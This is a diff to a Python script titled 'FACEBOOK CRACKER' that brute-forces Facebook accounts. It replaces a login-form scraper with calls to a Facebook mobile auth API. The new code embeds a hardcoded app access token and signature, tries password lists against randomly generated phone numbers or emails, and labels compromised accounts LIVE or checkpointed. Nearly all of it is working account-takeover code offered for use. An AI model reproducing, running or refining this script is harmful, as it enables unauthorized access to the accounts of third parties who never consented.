@@ -1,44 +1,35 @@
 #Coded by DulLah (fb.me/dulahz)
 
-import os, re, time, requests, concurrent.futures
+import os, re, requests, concurrent.futures
 from random import randint
 
 def brute(user, passs):
   try:
     for pw in passs:
-      session=requests.Session()
-      csrf=session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8')
-      action=re.findall('method="post" action="(.*?)"', csrf.text)[0]
-      lsd=re.findall('name="lsd" value="(.*?)"', csrf.text)[0]
-      jazoest=re.findall('name="jazoest" value="(.*?)"', csrf.text)[0]
-      m_ts=re.findall('name="m_ts" value="(.*?)"', csrf.text)[0]
-      li=re.findall('name="li" value="(.*?)"', csrf.text)[0]
-      data={
-        'lsd':lsd,
-        'jazoest':jazoest,
-        'm_ts':m_ts,
-        'li':li,
-        'email':str(user),
-        'pass':str(pw),
+      params={
+        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
+        'format': 'JSON',
+        'sdk_version': '2',
+        'email': user,
+        'locale': 'en_US',
+        'password': pw,
+        'sdk': 'ios',
+        'generate_session_cookies': '1',
+        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
       }
-      session.headers.update({
-        'user-agent':'Mozilla/5.0',
-        'referer':'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
-      })
-      session.post('https://mbasic.facebook.com{0}'.format(action), data=data)
-      cek=session.cookies.keys()
-      session.cookies.clear()
-      if 'checkpoint' in cek:
-        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
-        break;
-      elif 'c_user' in cek:
+      api='https://b-api.facebook.com/method/auth.login'
+      response=requests.get(api, params=params)
+      if re.search('(EAAA)\w+', str(response.text)):
         print('  [LIVE] %s -> %s '%(str(user), str(pw)))
-        break;
-  except: brute(user, passs)
+        break
+      elif 'www.facebook.com' in response.json()['error_msg']:
+        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
+        break
+  except: pass
 
 def random_numbers():
   data = []
-  os.system('clear')
+  os.system('cls' if os.name == 'nt' else 'clear')
   print('''
   [ FACEBOOK CRACKER RANDOM NUMBERS ]
 
@@ -63,7 +54,7 @@ def random_numbers():
 
 def random_email():
   data = []
-  os.system('clear')
+  os.system('cls' if os.name == 'nt' else 'clear')
   print('''
   [ FACEBOOK CRACKER RANDOM EMAIL ]
 
